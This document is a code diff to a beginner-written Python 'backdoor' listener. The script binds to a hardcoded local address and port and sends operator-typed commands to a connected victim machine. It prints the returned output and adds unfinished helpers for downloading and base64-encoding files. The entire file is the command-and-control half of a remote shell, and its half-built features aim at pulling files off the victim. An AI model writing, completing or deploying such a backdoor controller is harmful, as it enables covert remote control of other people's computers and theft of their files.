@@ -1,4 +1,5 @@
 import socket
+from base64 import b64encode, b64decode
 
 class back:
     '''Create a Class..!'''
@@ -14,27 +15,39 @@ class back:
         print("[+] Get a Connection" + str(addres))
 
     def command_send(self, comnd):
+        '''send and reciv data function'''
         self.connected.send(comnd)
 
-    def command(self):
-        '''Define a Function'''
-        return self.connected.recv(1024)
+    def donwload_data(self, name, contnd):
+        pass
 
-
+    def reciv_data(self):
+        '''reciv data for cliend'''
+        return self.connected.recv(2048).decode()
+    
+    def read_file(self, read_file_path):
+        '''this function use to read a file used to rb mood
+        and return the encode valu use to base64 library'''
+        with open(read_file_path, "rb") as f:
+            return f.read()
+       
+        
     def run(self):
-        '''function number tow'''
+        '''all function run if while True'''
         while True:
-            user_command = input(">>")
-            self.command_send(user_command.encode())
-            re_valu = self.command()
-            print(re_valu.decode())
+            read_command = input(">>")
+            # if read_command.startswith("downlod"):
+            
+           
+            self.command_send(read_command.encode())
+            
+            result = self.reciv_data()
+            print(result)
+
+
+
 
 
 
 listenr = back("192.168.0.102", 8080)
 listenr.run()
-
-
-
-
-
